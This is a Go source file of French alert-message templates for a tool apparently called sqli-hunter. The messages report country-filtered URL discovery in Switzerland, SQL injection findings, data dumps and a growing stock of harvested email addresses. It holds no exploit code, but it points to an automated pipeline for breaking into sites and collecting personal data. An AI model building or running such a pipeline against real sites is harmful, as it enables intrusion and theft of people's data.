package alert

import (
	"fmt"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

var fr = Texts{
	TitleDailyLaunch:   "Daily lancé",
	TitleScanComplete:  "Scan terminé",
	TitleDailyComplete: "Daily terminé",

	Launch:       frLaunch,
	DiscoverDone: frDiscoverDone,
	ScanStarted:  frScanStarted,
	Vuln:         frVuln,
	DumpFail:     frDumpFail,
	DumpOK:       frDumpOK,
	Complete:     frComplete,
	Error:        frError,
	StockSummary: frStockSummary,
	DailyLaunch:  frDailyLaunch,
	DailyNoNew:   frDailyNoNew,
}

func frLaunch(title, detail string) string {
	return "🚀 " + title + "\n" + detail
}

func frDiscoverDone(kept, skipped, fetched int) string {
	return fmt.Sprintf("🔎 Discover terminé\nURLs gardées: %d\nignorées: %d\nlues: %d", kept, skipped, fetched)
}

func frScanStarted(urlCount int, listFile string) string {
	return fmt.Sprintf("▶️ Scan lancé\nurls: %d\nfichier: %s", urlCount, listFile)
}

func frVuln(f models.Finding) string {
	return "🔴 VULN " + string(f.VulnType) + "\n" + formatFinding(f)
}

func frDumpFail(f models.Finding, reason string) string {
	return "⚠️ Dump impossible\n" + formatFinding(f) + "\nraison: " + reason
}

func frDumpOK(d models.ExtractedData, email string) string {
	return "✅ Dump OK\n" + formatDumpDetail(d, email)
}

func frComplete(title, detail string) string {
	return "🏁 " + title + "\n" + detail
}

func frError(msg string) string {
	return "❌ " + msg
}

func frStockSummary(baseDir string) string {
	return stockLines(baseDir, "stock emails:", "• %s — %d", "stock emails: vide")
}

func frDailyLaunch(limit, threads int, outputDir string) string {
	return fmt.Sprintf("discover: Suisse (country=CH)\nlimit: %d urls\nthreads: %d\noutput: %s/emails/", limit, threads, outputDir)
}

func frDailyNoNew(baseDir string) string {
	return "Rien de nouveau\n" + frStockSummary(baseDir)
}
